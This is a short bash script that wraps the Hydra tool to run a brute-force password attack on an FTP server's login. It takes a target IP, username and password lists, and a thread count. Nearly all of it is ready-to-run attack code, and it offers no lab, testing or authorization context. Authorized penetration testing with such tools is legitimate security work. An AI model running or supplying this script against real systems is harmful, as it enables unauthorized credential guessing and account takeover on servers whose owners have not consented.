#!/bin/bash
# Hydra - Brute Force FTP Login
# Options:
# -L : List of usernames
# -P : List of passwords
# -t : Number of parallel connections

# Usage: hydra_ftp.sh <target_ip> <username_list> <password_list> <threads>
# Example script
# hydra_ftp.sh 192.168.1.1 usernames.txt passwords.txt 4

# Check if hydra is installed
if ! command -v hydra &> /dev/null
then
    echo "hydra could not be found, please install it first."
    exit
fi

# Ensure parameters are provided
if [ "$#" -ne 4 ]; then
    echo "Usage: $0 <target_ip> <username_list> <password_list> <threads>"
    exit 1
fi

TARGET=$1
USERLIST=$2
PASSLIST=$3
THREADS=$4

echo "Starting FTP brute force on $TARGET with $THREADS threads"

# Perform brute force attack
hydra -L $USERLIST -P $PASSLIST ftp://$TARGET -t $THREADS

echo "FTP brute force attack completed."
